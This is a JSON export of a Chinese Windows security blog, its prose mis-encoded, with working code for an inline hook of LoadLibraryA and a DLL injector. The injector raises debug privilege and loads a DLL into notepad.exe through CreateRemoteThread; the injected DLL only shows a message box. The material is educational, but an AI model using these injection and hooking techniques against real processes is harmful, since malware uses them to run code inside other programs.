CreateRemoteThreadExï¼Œè¿™æ˜¯ä¸€ä¸ªç”± KernelBase.dll æä¾›çš„æ›´åº•å±‚çš„ APIï¼Œæä¾›äº†æ›´å¤šçš„é€‰é¡¹ï¼Œæ¯”å¦‚å¯ä»¥æŒ‡å®šå®‰å…¨æè¿°ç¬¦ï¼Œå¯ä»¥æ§åˆ¶æ–°çº¿ç¨‹æ˜¯å¦ç«‹å³å¼€å§‹è¿è¡Œç­‰ CreateRemoteThreadEx å†…éƒ¨è°ƒç”¨ NtCreateThreadExï¼Œè¿™æ˜¯ç”± ntdll.dll æä¾›çš„ Native APIï¼Œä¹Ÿæ˜¯ç”¨æˆ·ç©ºé—´å¯ä»¥ç›´æ¥è°ƒç”¨çš„æœ€åº•å±‚çš„ APIã€‚ NtCreateThreadEx å‡½æ•°è®¾ç½®å¥½ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°åï¼Œæ‰§è¡Œ syscall æŒ‡ä»¤ï¼Œåˆ‡æ¢åˆ°å†…æ ¸æ¨¡å¼ã€‚ åœ¨å†…æ ¸æ¨¡å¼ä¸‹ï¼Œæ ¹æ® syscall æä¾›çš„ç³»ç»Ÿè°ƒç”¨ç¼–å·ï¼Œåœ¨ SSDT è¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„å†…æ ¸å‡½æ•°ã€‚ æ‰§è¡Œ SSDT è¡¨ä¸­æ‰¾åˆ°çš„å‡½æ•°ï¼Œå®Œæˆçº¿ç¨‹çš„åˆ›å»ºã€‚ flowchart TD A(CreateRemoteThread) --> B B(Kernel32!CreateRemoteThreadSutb) --> C C(Kernel32!CreateRemoteThreadEx) --> D D(ntdll!NtcreateThreadEx) --> F F(nt!NtcreateThreadEx) --> E E(syscall) --> G subgraph å†…æ ¸åŒº G(SSDT) end å¦‚ä¸‹æ‰€ç¤ºä¸ºä¸€ä¸ªç•¥å¾®è¯¦ç»†çš„å¯åŠ¨åˆ†æï¼š 0x04 æ™®é€šçº¿ç¨‹å’Œè¿œç¨‹çº¿ç¨‹çš„åŒºåˆ« å¯ä»¥çœ‹åˆ°æ™®é€šçº¿ç¨‹å‡½æ•°CreateThreadä¹Ÿè°ƒç”¨äº†CreateRemoteThreadå‡½æ•°ï¼Œåªä¸è¿‡å…¶çº¿ç¨‹å¥æŸ„å‚æ•°çš„å€¼ä¸º -1ï¼Œè€Œè¿œç¨‹çº¿ç¨‹çš„å¥æŸ„å‚æ•°ä¸ºç›®æ ‡è¿›ç¨‹å¥æŸ„","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"},{"name":"CreateRemoteThread","slug":"A-OS/Windows/API/CreateRemoteThread","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/CreateRemoteThread/"}]},{"title":"ã€Hookã€‘ æŠ€æœ¯ç›¸å…³ç²¾åæ–‡ç« æ•´ç†","date":"2024-01-23T06:08:33.915Z","path":"A_OS/Windows/Inject&Hook/ã€IHã€‘Hookç›¸å…³ç²¾åæ–‡ç« æ•´ç†/","text":"æ¦‚è¿°ï¼šhook ç›¸å…³æ–‡ç«  0x01 é˜…è¯»åˆ—è¡¨ [ ] [åŸåˆ›]HOOK-ç¼–ç¨‹æŠ€æœ¯-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com [ ] é«˜çº§è¿œç¨‹çº¿ç¨‹æ³¨å…¥NtCreateThreadEx - iBinary - åšå®¢å›­ [ ] ä½¿ç”¨NtCreateThreadExå°†Dllæ³¨å…¥ç›®æ ‡è¿›ç¨‹ | ç å†œå®¶å›­ [ ] çº¿ç¨‹åˆ›å»ºè¿‡ç¨‹åˆ†æNtCreateThread-PspCreateThread [ ] PsTerminateProcessç»“æŸè¿›ç¨‹ - gussing - åšå®¢å›­ [ ] [åŸåˆ›]å¼ºåˆ¶å…³é—­è¿›ç¨‹çš„ä¸¤ç§æ–¹æ³•-ç¼–ç¨‹æŠ€æœ¯-çœ‹é›ª-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|kanxue.com [ ] ã€æŠ€æœ¯åˆ†äº«ã€‘åˆæ¢è¿›ç¨‹å¼ºæ€ 0x02 Hook ä»£ç  [ ] MinHook - The Minimalistic x86/x64 API Hooking Library - CodeProject","tags":[{"name":"Hook","slug":"Hook","permalink":"https://hodlyounger.github.io/tags/Hook/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Inject&Hook","slug":"A-OS/Windows/Inject-Hook","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Inject-Hook/"}]},{"title":"ã€Hookã€‘Windows Hook æ¨¡ç‰ˆ","date":"2024-01-23T06:08:33.912Z","path":"A_OS/Windows/Inject&Hook/ã€IHã€‘Hookæ¨¡ç‰ˆ/","text":"æ¦‚è¿°ï¼šhookæ³¨å…¥çš„æ¨¡ç‰ˆå‡½æ•°ï¼Œä»¥ hook loadlibrary ä¸ºä¾‹ ä¸»è¦æ˜¯åˆ›å»ºäº† __InlineHOOK_Base ç”¨äºå®ç°å‡½æ•°çš„æ³¨å…¥ã€‚ ç”±äºç¨‹åºåœ¨åˆ›å»ºå’Œæ‰§è¡Œæ—¶ä¼šä½¿ç”¨ LoadLibrary å‡½æ•°ã€‚ å› æ­¤éœ€è¦åœ¨è°ƒç”¨æ˜¯æ—¶å…ˆ unhook åœ¨ Hookæ¨¡ç‰ˆ ä»¥ä¸‹ä¸¤ä¸ªå®å®šä¹‰å³å¯å®Œæˆå‡½æ•°çš„hook 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154/* C/C++ HOOK APIï¼ˆåŸç†æ·±å…¥å‰–æä¹‹-LoadLibraryAï¼‰_c++ loadlibrarya-CSDNåšå®¢: https://blog.csdn.net/masefee/article/details/4566121*/#include &lt;iostream&gt;#include &lt;Windows.h&gt;using namespace std;#pragma warning( disable: 4309 )#pragma warning( disable: 4311 )typedef HMODULE(WINAPI* HOOKAPI)(IN LPCSTR);#define MYHOOKMETHOD(__fun) HMODULE WINAPI __fun#define DECLARE_REGISTER( __0bj, __lawfunc, __newfunc ) Inline_Hook&lt; HOOKAPI, 1 &gt; __Obj( __lawfunc, __newfunc )struct __InlineHOOK_Base&#123; DWORD _argsBytes; void* _lawFunc; void* _newFunc; char _lawByteCode[16]; char _newByteCode[16]; bool unhook(void) &#123; // It&#x27;s hooked. if (memcmp(_newByteCode, _lawFunc, 16) == 0) &#123; DWORD dwOldFlag; VirtualProtect(_lawFunc, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag); memcpy(_lawFunc, _lawByteCode, 16); VirtualProtect(_lawFunc, 8, dwOldFlag, &amp;dwOldFlag); return true; &#125; return false; &#125; bool hook(void) &#123; // It&#x27;s saved. if (memcmp(_lawByteCode, _lawFunc, 16) == 0) &#123; DWORD dwOldFlag; VirtualProtect(_lawFunc, 8, PAGE_EXECUTE_READWRITE, &amp;dwOldFlag); memcpy(_lawFunc, _newByteCode, 16); VirtualProtect(_lawFunc, 8, dwOldFlag, &amp;dwOldFlag); return true; &#125; return false; &#125; __InlineHOOK_Base(void* lawfun, void* newfun, DWORD args);&#125;;void __declspec(naked) __Inline_Hook_Func(void)&#123; __asm &#123; push ebp // save maybe usefull register. push ebx push esi push ecx call __InlineHOOK_Base::unhook // first, remove the hook in order to call the normal function. test eax, eax // check the remove was successful jz __return __getargnum : mov eax, dword ptr[esp] // esp just is ecx, also is __InlineHOOK_Base&#x27;s this pointer. mov ecx, dword ptr[eax] // get first 4 bytes, that is params total size. shr ecx, 2 // get params num, equal with __InlineHOOK_Base::_argsBytes / sizeof( DWORD ) test ecx, ecx // check whether there are params. jz __callfunc // no param __pushargs : mov edx, esp // __InlineHOOK_Base&#x27;s this pointer. add edx, 14h // navigate to first call ret addr. add edx, dword ptr[eax]; // add params size. push dword ptr[edx]; // push the dll file name pointer. loop __pushargs __callfunc : call[eax + 8] // call my function . mov ecx, dword ptr[esp] // get __InlineHOOK_Base&#x27;s this pointer. push edx // save my function return value. push eax call __InlineHOOK_Base::hook // rehook. pop eax // get saved return value, provided to my superiors to use pop edx __return : pop ecx pop esi pop ebx pop ebp ret &#125;&#125;__InlineHOOK_Base::__InlineHOOK_Base(void* lawfun, void* newfun, DWORD args) : _lawFunc(lawfun), _newFunc(newfun), _argsBytes(args * 4)&#123; _newByteCode[0] = 0xB9; // mov ecx, ... (DWORD&amp;)_newByteCode[1] = (DWORD)this; _newByteCode[5] = 0xB8; // mov eax, ... (DWORD&amp;)_newByteCode[6] = (DWORD)__Inline_Hook_Func; (WORD&amp;)_newByteCode[10] = 0xD0FF; // call eax _newByteCode[12] = 0x000000C3; // ret if (args &gt; 0) &#123; _newByteCode[12] = 0xC2; // ret ... (WORD&amp;)_newByteCode[13] = (WORD)_argsBytes; _newByteCode[15] = 0; &#125; memcpy(_lawByteCode, _lawFunc, 16); // save&#125;template&lt; typename _function, DWORD args &gt;struct Inline_Hook : __InlineHOOK_Base&#123; Inline_Hook(_function lawfun, _function newfun) :__InlineHOOK_Base(lawfun, newfun, args) &#123; hook(); &#125; ~Inline_Hook(void) &#123; unhook(); &#125;&#125;;MYHOOKMETHOD(myLoadLibrary)(LPCSTR lpcStrFileName)&#123; ::MessageBoxA(NULL, lpcStrFileName, &quot;LoadLibrary Name&quot;, MB_OK | MB_ICONINFORMATION); return LoadLibraryA(lpcStrFileName);&#125;DECLARE_REGISTER(__inline_hook, LoadLibraryA, myLoadLibrary);int main(void)&#123; HMODULE hIntstance = LoadLibraryA(&quot;d3d9.dll&quot;); return 0;&#125; å¦‚ä½•ä½¿ç”¨ï¼Œä½¿ç”¨å®è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ç¨‹åºæ‰§è¡Œå‰å®Œæˆã€‚ 1DECLARE_REGISTER(__inline_hook, LoadLibraryA, myLoadLibrary);","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Hook","slug":"Hook","permalink":"https://hodlyounger.github.io/tags/Hook/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Inject&Hook","slug":"A-OS/Windows/Inject-Hook","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Inject-Hook/"}]},{"title":"ã€Hookã€‘Dll æ³¨å…¥","date":"2024-01-23T06:08:33.909Z","path":"A_OS/Windows/Inject&Hook/ã€IHã€‘dllæ³¨å…¥/","text":"æ¦‚è¿°ï¼šwindows æ“ä½œç³»ç»Ÿä¸‹æ³¨å…¥dllåˆ°è¿›ç¨‹ä¸­ ç¯å¢ƒç›¸å…³ï¼šwin10æ“ä½œç³»ç»Ÿæ³¨å…¥æœ¬åœ°ç¼–è¯‘çš„ç®€å•dllåˆ°notepad.exe å…¶ä»–é—®é¢˜è¡¥å……ï¼š CreateRemoteThreadå‡½æ•°å¤šå‚æ•°ä¼ å…¥ä½¿ç”¨æ–¹æ³•_createremotethread ä¼ é€’å‚æ•°-CSDNåšå®¢ å¤šå‚æ•°é—®é¢˜ï¼šlem0nSec/CreateRemoteThreadPlus: CreateRemoteThread: how to pass multiple parameters to the remote thread function without shellcode. 0x01ã€ åŸºæœ¬çŸ¥è¯† æ³¨å…¥dllçš„ç®€å•é€»è¾‘å°±æ˜¯è¦åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·å†…å­˜åŠ è½½ä¸€ä¸ªdllã€‚åˆ†æ­¥éª¤æ¥è¯´å°±æ˜¯ï¼š æ‰“å¼€è¿›ç¨‹ ç”³è¯·å†…å­˜ å†™å…¥å†…å­˜ è°ƒç”¨å†…å­˜çš„å‡½æ•° 0x02ã€æ“ä½œæ­¥éª¤ å‰æ è¿›ç¨‹é—´å†…å­˜ç‹¬ç«‹ è¿è¡Œåœ¨å®‰å…¨æ¨¡å¼ä¸‹çš„Windowsï¼Œæ¯ä¸ªè¿›ç¨‹çš„å†…å­˜ç©ºé—´éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œäº’ç›¸ä¸èƒ½è®¿é—®å½¼æ­¤ï¼Œæ‰€ä»¥ä»£ç æ³¨å…¥æ‰æ˜¯ä¸€ä»¶æ¯”è¾ƒéº»çƒ¦çš„äº‹æƒ… æ‰€æœ‰è¿›ç¨‹ä¸­ kernel32.dllåœ°å€ç›¸åŒ æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šåŠ è½½kernel32.dllï¼Œå¹¶ä¸”åœ¨é‚£äº›è¿›ç¨‹ä¸­ï¼Œè¿™ä¸ªåº“çš„åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ åŸç† dllæ³¨å…¥ä¸»è¦åˆ†ä¸ºå¦‚ä¸‹å‡ ä¸ªæ­¥éª¤ ææƒï¼šå¦‚æœä¸ææƒçš„è¯ï¼Œè¿›ç¨‹åˆ—è¡¨ä¸­å¾ˆå¤šè¿›ç¨‹æ˜¯æ‰“ä¸å¼€çš„ï¼Œå¹¶ä¸”å¯èƒ½è·å–ä¸åˆ°PROCESS_ALL_ACCESSæƒé™ è·å–PIDï¼šè¿™éƒ¨åˆ†ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æ˜¯PIDæ¯æ¬¡è¿è¡Œéƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æœ€å¥½èƒ½è·å–ï¼Œè¿™é‡Œé€šè¿‡CreateToolhelp32Snapshot()å‡½æ•°è·å–è¿›ç¨‹ï¼Œéå†ç»“æœä¹‹åå¾—åˆ°å¯¹åº”çš„PID æ‰“å¼€è¿›ç¨‹ï¼šé€šè¿‡OpenProcess()å‡½æ•°æ‰“å¼€è¿›ç¨‹ï¼ŒåŒæ—¶æŒ‡å®šæƒé™æ˜¯PROCESS_ALL_ACCESSæƒé™ï¼Œå¦åˆ™åé¢æ“ä½œä¼šå¤±è´¥ï¼Œå¦‚æœè¦è·å–è¿™ä¸ªæƒé™å°±å¾—å…ˆææƒ é€šè¿‡VirtualAllocEx()å‡½æ•°åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ç”³è¯·å†…å­˜ï¼Œç„¶åç”¨WriteProcessMemory()å‡½æ•°å°†LoadLibraey()å‡½æ•°çš„å‚æ•°å‡†å¤‡å¥½å†™å…¥åˆ°å†…å­˜ä¸­ é€šè¿‡LoadLibrary()å‡½æ•°åŠ è½½kernel32.dllï¼Œå®é™…ä¸Šè¿›ç¨‹éƒ½ä¼šåŠ è½½è¿™ä¸ªï¼Œç¬¬äºŒæ¬¡åŠ è½½ä¼¼ä¹ç›´æ¥è·å–æ¨¡å—å¥æŸ„äº†ã€‚ é€šè¿‡GetProcAddress()å‡½æ•°è·å–åˆ°LoadLibraryW()å‡½æ•°çš„åœ°å€ï¼Œå› ä¸ºkernel32.dllåœ¨æ‰€æœ‰è¿›ç¨‹ä¸­çš„åœ°å€éƒ½ç›¸åŒï¼Œæ‰€ä»¥ï¼Œåœ¨æœ¬è¿›ç¨‹ä¸­è·å–çš„å‡½æ•°åœ°å€åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ä¹Ÿæ˜¯é‚£ä¸ªå‡½æ•° é€šè¿‡CreateRemoteThread()å‡½æ•°åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰§è¡ŒLoadLibraryW()å‡½æ•°è½½å…¥è‡ªå·±çš„dll 0x03ã€ä»£ç  InjectDll.exe InjectDll.exe çš„ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š å®Œæˆäº†æ³¨å…¥ simpledll.dll åˆ° notepad.exe çš„åŠŸèƒ½ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;tlhelp32.h&gt;using namespace std;DWORD GetPidByName(LPCWSTR lpName)&#123; DWORD pid = 0; HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (!hSnap) &#123; cout &lt;&lt; &quot;Create Process Snap failed&quot; &lt;&lt; endl; return 0; &#125; PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); Process32First(hSnap, &amp;pe); do &#123; if (!_wcsicmp(lpName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; while (Process32Next(hSnap, &amp;pe)); return pid;&#125;bool EnableDebugPrivilege()&#123; bool bRet = false; HANDLE token; TOKEN_PRIVILEGES tp; // æ‰“å¼€è¿›ç¨‹ä»¤ç‰Œç¯ if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;token)) &#123; cout &lt;&lt; &quot;Open Toekn Failed&quot; &lt;&lt; endl; return bRet; &#125; // è·å–è¿›ç¨‹uuid LUID luid; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid)) &#123; cout &lt;&lt; &quot;Get uid failed&quot; &lt;&lt; endl; return bRet; &#125; tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tp.Privileges[0].Luid = luid; // è°ƒæ•´è¿›ç¨‹æƒé™ if (!AdjustTokenPrivileges(token, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123; cout &lt;&lt; &quot;Adjust Privilege failed&quot; &lt;&lt; endl; return bRet; &#125; bRet = true; return bRet;&#125;int main(char* argc, const char* argv[])&#123; // å…ˆææƒ if (!EnableDebugPrivilege()) &#123; cout &lt;&lt; &quot;ææƒå¤±è´¥&quot; &lt;&lt; endl; return 0; &#125; DWORD dwTargetPid = GetPidByName(L&quot;notepad.exe&quot;); if (!dwTargetPid) &#123; cout &lt;&lt; &quot;Get Target Process Id failed&quot; &lt;&lt; endl; return 0; &#125; // æ‰“å¼€ç›®æ ‡è¿›ç¨‹ HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, false, dwTargetPid); if (!hTarget) &#123; cout &lt;&lt; &quot;Open Target Process failed&quot; &lt;&lt; endl; return 0; &#125; // åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·å†…å­˜ void* pLoadLibFuncParam = nullptr; pLoadLibFuncParam = VirtualAllocEx(hTarget, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (pLoadLibFuncParam == nullptr) &#123; cout &lt;&lt; &quot;alloc memery failed&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; LPCTSTR lpParam = L&quot;C:\\\\6\\\\SimpleDll.dll&quot;; if (!WriteProcessMemory(hTarget, pLoadLibFuncParam, (LPCVOID)lpParam, (wcslen(lpParam) + 1) * sizeof(TCHAR), NULL)) &#123; cout &lt;&lt; &quot;å†™å…¥å†…å­˜å¤±è´¥&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; HMODULE hNtdll = LoadLibrary(L&quot;kernel32.dll&quot;); if (!hNtdll) &#123; cout &lt;&lt; &quot;åŠ è½½æ¨¡å—é”™è¯¯&quot; &lt;&lt; GetLastError() &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; cout &lt;&lt; &quot;æ¨¡å—å¥æŸ„: &quot; &lt;&lt; hNtdll &lt;&lt; endl; void* pLoadLibrary = nullptr; pLoadLibrary = GetProcAddress(hNtdll, &quot;LoadLibraryW&quot;); if (pLoadLibrary == nullptr) &#123; cout &lt;&lt; &quot;æ‰¾ä¸åˆ°å‡½æ•°&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; cout &lt;&lt; &quot;å‡½æ•°åœ°å€: &quot; &lt;&lt; pLoadLibrary &lt;&lt; endl; DWORD dwThreadId = 0; HANDLE hRemoteThread = CreateRemoteThread(hTarget, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, (LPVOID)pLoadLibFuncParam, 0, &amp;dwThreadId); if (!hRemoteThread) &#123; cout &lt;&lt; &quot;åˆ›å»ºè¿›ç¨‹å¤±è´¥&quot; &lt;&lt; GetLastError() &lt;&lt; endl; CloseHandle(hTarget); return 0; &#125; cout &lt;&lt; &quot;è¿è¡Œç»“æŸ&quot; &lt;&lt; hRemoteThread &lt;&lt; endl; getchar(); getchar(); CloseHandle(hTarget); return 0;&#125; simpledll.dll simple åªéœ€è¦ç®€å•å†™ä¸€ä¸ªå¯¹è¯æ¡†å±•ç¤ºå³å¯ï¼š 12345678910111213141516171819202122232425// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚#include &quot;pch.h&quot;DWORD WINAPI ThreadProc()&#123; MessageBox(NULL, L&quot;æˆ‘å·²æˆåŠŸæ‰“å…¥æ•Œäººå†…éƒ¨ By Startu&quot;, L&quot;æŠ¥å‘Šé¦–é•¿&quot;, 0); return 0;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, NULL, 0, NULL); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; è¡¥å……è¯´æ˜ éœ€è¦æ³¨æ„ æ³¨å…¥çš„dllè¦å’Œnotepad.exe ç¼–è¯‘ç‰ˆæœ¬ä¿æŒä¸€è‡´ã€‚notepad.exe æ˜¯ä¸€ä¸ª 64bit è¿›ç¨‹ 0x04ã€æ¼”ç¤º å·¥ç¨‹æ–‡ä»¶ï¼šWindows-API-Usage/kernel32/DLLInject/DllInject at master Â· holdyounger/Windows-API-Usage","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"Inject&Hook","slug":"A-OS/Windows/Inject-Hook","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/Inject-Hook/"}]},{"title":"ã€Hookã€‘32ä½ç¨‹åºå¯¹64ä½ç¨‹åºè¿œç¨‹æ³¨å…¥çš„å®ç°","date":"2024-01-23T06:08:33.905Z","path":"A_OS/Windows/Inject&Hook/ã€IHã€‘32ä½ç¨‹åºå¯¹64ä½ç¨‹åºçš„æ³¨å…¥/","text":"æ¦‚è¿°ï¼šã€å­¦ä¹ è®°å½•ã€‘å®ç° 32 ä½ç¨‹åºå¯¹ 64ä½ç¨‹åºçš„æ³¨å…¥ï¼Œå€Ÿé‰´ 3gstudent å’Œ odzhan çš„å®ç°ã€‚ ç¯å¢ƒè¯´æ˜ï¼š windows x64 è¢«æ³¨å…¥ç¨‹åº x86 dll 0x01ã€å‰è¨€ é€šå¸¸è¦å®ç°è¿œç¨‹æ³¨å…¥éƒ½éœ€è¦è°ƒç”¨ CreateRemoteThread å‡½æ•°åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªè¿œç¨‹çº¿ç¨‹ï¼Œè¿›è€Œæ³¨å…¥dllæˆ–æ˜¯æ‰§è¡Œshellcodeã€‚å¦‚ä¸‹æ‰€ç¤ºä¸ºæ³¨å…¥ä¸€ä¸ªç®€å•çš„dllåˆ°notepadä¸­ã€‚ æ³¨å…¥çš„å¸¸è§„æµç¨‹ä¸ºï¼š æœ¬åœ°ææƒ è·å–ç›®æ ‡è¿›ç¨‹çš„pid æ‰“å¼€ç›®æ ‡è¿›ç¨‹ åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·å†…å­˜å¹¶å†™å…¥å†…å­˜ é€šè¿‡å…¬å…±å‡½æ•°è°ƒç”¨åˆ›å»ºè¿œç¨‹çº¿ç¨‹ å‚è€ƒä»£ç è§æ–‡ç«  ã€IHã€‘dllæ³¨å…¥ ä½†æ˜¯ï¼Œåœ¨64ä½æ“ä½œç³»ç»Ÿä¸Šï¼Œç”±äº32ä½å’Œ64ä½çš„ç»“æ„ä¸åŒï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æ³¨å…¥å¤±è´¥ã€‚ 0x02ã€å®ç°æ€è·¯ ä¸»è¦æ€è·¯ä¸ºï¼šå°† CreateRemoteThread åˆ‡æ¢ä¸º64ä½çš„ CreateRemoteThread åå†åˆ›å»ºçº¿ç¨‹ï¼Œå®Œæˆåå†åˆ‡æ¢å›32ä½ï¼Œå³å¯å®ç°32ä½ç¨‹åºå¯¹64ä½è¿›ç¨‹çš„è¿œç¨‹æ³¨å…¥ã€‚åˆ‡æ¢çš„æ“ä½œä¸»è¦æ˜¯æ±‡ç¼–ä»£ç å®ç°çš„ã€‚è®°å½•ä¸€ä¸‹ã€‚ 1 è·å–64ä½ CreateRemoteThread å‡½æ•°åœ°å€ è·å–64ä½ CreateRemoteThread ä¸»è¦ç”±æ±‡ç¼–ä»£ç å®ç°ã€‚ å‚è€ƒåšå®¢ï¼šDLL/PIC Injection on Windows from Wow64 process | modexp ç›¸å…³ä»£ç  shellcode/os/win/pi at master Â· odzhan/shellcode 2 æ³¨å…¥çº¿ç¨‹å¹¶è°ƒç”¨ å‚è€ƒä»£ç ï¼š CreateRemoteThreadç®€å•åº”ç”¨-CSDNåšå®¢ ä¸»è¦é€»è¾‘ä¸ºï¼š è·å–ç›®æ ‡è¿›ç¨‹PID éœ€è¦åˆ¤æ–­ç³»ç»Ÿæ“ä½œæ•° éœ€è¦åˆ¤æ–­ç›®æ ‡è¿›ç¨‹çš„æ“ä½œæ•° ç”³è¯·å†…å­˜ è·å– CreateRemoteThread å‡½æ•°çš„åœ°å€ åˆ›å»ºè¿œç¨‹çº¿ç¨‹ 3 åˆ¤æ–­ç³»ç»Ÿæ“ä½œæ•° 12345678910111213141516171819202122232425#include &lt;windows.h&gt;BOOL Is64BitOS()&#123; typedef VOID (WINAPI *LPFN_GetNativeSystemInfo)( __out LPSYSTEM_INFO lpSystemInfo ); LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;),&quot;GetNativeSystemInfo&quot;); if(fnGetNativeSystemInfo) &#123; SYSTEM_INFO stInfo = &#123;0&#125;; fnGetNativeSystemInfo( &amp;stInfo); if( stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return TRUE; &#125; &#125; return FALSE;&#125;int main()&#123; if (Is64BitOS()) printf(&quot;x64\\n&quot;); else printf(&quot;x86\\n&quot;); return 0;&#125; 4 åˆ¤æ–­ç›®æ ‡è¿›ç¨‹æ˜¯ä¸æ˜¯ 64 ä½ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;windows.h&gt;#include &lt;TlHelp32.h&gt; BOOL IsWow64(HANDLE hProcess)&#123; typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); LPFN_ISWOW64PROCESS fnIsWow64Process; BOOL bIsWow64 = FALSE; fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;),&quot;IsWow64Process&quot;); if (NULL != fnIsWow64Process) &#123; fnIsWow64Process(hProcess, &amp;bIsWow64); &#125; return bIsWow64;&#125;DWORD processNameToId(LPCTSTR lpszProcessName) &#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0; &#125; int main()&#123; BOOL bWow64; char *szExeName=&quot;calc.exe&quot;; DWORD dwProcessId = processNameToId(szExeName); if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;,&quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1; &#125; HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; bWow64 = IsWow64(hTargetProcess); if(bWow64) printf(&quot;32-bit process\\n&quot;); else printf(&quot;64-bit process\\n&quot;);&#125; 0x03ã€å®Œæ•´ä»£ç  